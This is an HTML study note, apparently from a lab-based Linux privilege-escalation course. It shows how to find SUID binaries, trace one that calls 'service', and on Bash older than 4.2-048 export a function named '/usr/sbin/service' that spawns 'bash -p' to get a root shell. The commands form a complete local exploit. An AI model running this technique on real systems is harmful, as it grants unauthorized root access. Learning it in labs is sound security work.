<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abusing Shell Features (define user functions)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Abusing Shell Features (define user functions)</h1><br /><strong>Prerequisite:</strong><br /> ◇
    Bash version lower than 4.2-048<br /><br />• In some shells (notably Bash &lt;4.2-048) it is possible to define user
    functions with an absolute path name.<br />• These functions can be exported so that subprocesses have access to
    them, and the functions can take precedence over the actual executable being called.<br /><br />1. manually locate
    files with the SUID or SGID bits set:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;find&nbsp;/&nbsp;-type&nbsp;f&nbsp;-a&nbsp;\(&nbsp;-perm&nbsp;-u+s&nbsp;-o&nbsp;-perm&nbsp;-g+s&nbsp;\)&nbsp;-exec&nbsp;ls&nbsp;-l&nbsp;{}&nbsp;\;&nbsp;2&gt;&nbsp;/dev/null
      </div>
    </div><br /> <a href=""><img src="images/1309-1.png" alt="images/1309-1.png" /></a><br /> <a href=""><img
        src="images/1309-2.png" alt="images/1309-2.png" /></a><br />2. Run strings on the S<span
      style="color:#1e90ff;">U</span>ID file:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;strings&nbsp;/usr/local/bin/suid-env2</div>
    </div><br /> <a href=""><img src="images/1309-3.png" alt="images/1309-3.png" /></a><br /> This time the <span
      style="color:#ff8700;">service</span> run with an absolute path <br />3. We can verify this <br /> ◇ with <span
      style="text-decoration:underline;">strace</span>:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;strace&nbsp;-v&nbsp;-f&nbsp;-e&nbsp;execve&nbsp;/usr/local/bin/suid-env2&nbsp;2&gt;&amp;1&nbsp;|&nbsp;grep&nbsp;service
      </div>
    </div><br /> <a href=""><img src="images/1309-4.png" alt="images/1309-4.png" /></a><br /> ◇ with <span
      style="text-decoration:underline;">ltrace</span>:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;ltrace&nbsp;/usr/local/bin/suid-env2&nbsp;2&gt;&amp;1&nbsp;|&nbsp;grep&nbsp;service</div>
    </div><br /> <a href=""><img src="images/1309-5.png" alt="images/1309-5.png" /></a><br /> This reveals that the
    system function is being used to execute the /usr/local/bin/suid-env2 <span style="color:#ff9d00;">service</span>
    program<br />4. Verify the version of Bash is lower than 4.2-048:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;bash&nbsp;--version</div>
    </div><br /> <a href=""><img src="images/1309-6.png" alt="images/1309-6.png" /></a> <br />5. Create a Bash function
    with the name “/usr/sbin/service” and export the function.<br /> &quot;Exporting&quot; a function using export -f
    creates an environment variable with the function body<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;function&nbsp;/usr/sbin/service&nbsp;{&nbsp;/bin/bash&nbsp;-p;&nbsp;}&nbsp;&nbsp;&nbsp;#new&nbsp;bash&nbsp;function&nbsp;called&nbsp;/usr/sbin/service<br />target@debian:~$&nbsp;export&nbsp;–f&nbsp;/usr/sbin/service
      </div>
    </div><br /> <span style="text-decoration:underline;">Note</span>: export -f → the -f must be used if the names
    refer to functions. If -f is not used, the export will assume the names are variables.<br />6. Execute the SUID file
    for a root shell. <br /> The function created at point 5 take precedence over the actual executable being
    called<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;/usr/local/bin/suid-env2</div>
    </div><br /> <a href=""><img src="images/1309-7.png" alt="images/1309-7.png" /></a>
  </div>
</body>

</html>